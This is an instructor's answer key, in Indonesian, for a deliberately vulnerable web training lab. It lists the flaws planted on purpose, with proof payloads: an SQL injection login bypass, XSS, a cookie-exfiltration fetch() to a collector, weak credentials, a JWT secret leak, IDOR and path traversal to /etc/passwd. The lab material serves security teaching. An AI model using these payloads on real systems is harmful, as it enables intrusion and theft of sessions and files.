# Kunci Pelatih - Jangan Dibagikan kepada Siswa

## Web Internal 8080

Finding baseline yang ditanam:

1. `server_tokens on` sehingga versi Nginx dapat terlihat.
2. Security header belum dikonfigurasi.
3. Directory listing aktif pada `/download/`.
4. File dummy `/download/backup-config.txt` dapat dibaca.
5. `robots.txt` membocorkan path sensitif.
6. Halaman `/admin/` belum memiliki autentikasi aplikasi.

## Web Vulnerable 8081

1. **SQL Injection** pada `POST /login`.
   - Contoh pembuktian lab: username `admin' -- ` dan password bebas.
2. **Reflected XSS** pada `/search?q=`.
   - Payload lab: `<script>alert('UKK')</script>`.
3. **Stored XSS** pada `/comments`.
   - Cookie `lab_session` sengaja tidak HttpOnly.
4. **Simulasi cookie theft/exfiltration**.
   - Payload lab internal: `<script>fetch('/collector?c='+encodeURIComponent(document.cookie))</script>`
   - Bukti pada `/admin/collector` dan `logs/web-vuln/collector.log`.
5. **Weak credentials**.
   - `admin/admin123`, `siswa/siswa123`, `auditor/audit2026`.
6. **JWT signing secret exposure**.
   - Petunjuk di `/robots.txt`.
   - File `/static/backup/app.env.bak` memuat secret dummy.
   - `POST /api/login` menghasilkan HS256 JWT.
   - `/api/admin` memercayai claim `role=admin` jika signature valid.
7. **IDOR** pada `/api/profile/<id>` tanpa autentikasi.
8. **Path traversal** pada `/download?file=`.
   - Contoh pembuktian dalam container: `../../../../etc/passwd`.
9. **Missing security headers** dan detail error pada Web Lab.

## Batas Keselamatan

- Seluruh exploit hanya pada container ini.
- Jangan memasang container privileged.
- Jangan mount Docker socket atau direktori host sensitif.
- Jangan meneruskan port Web Lab ke internet.
- Cookie collector hanya menerima data dummy dari origin lab yang sama.
